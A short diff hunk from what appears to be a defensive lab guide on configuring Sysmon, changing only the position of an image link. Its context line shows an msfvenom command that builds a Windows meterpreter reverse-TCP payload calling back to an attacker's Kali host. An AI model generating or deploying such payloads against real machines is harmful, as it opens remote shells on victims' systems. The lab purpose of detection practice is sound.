@@ -112,7 +112,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > 
 1. Install Sysmon and create `sysmonconfig.xml` configuration file in the same directory
 
   Configuration example:
-    ![Alt text](images/19.png)
+
+   ![Alt text](images/19.png)
 
 Note:
    - Use `onmatch="include"` for filetring
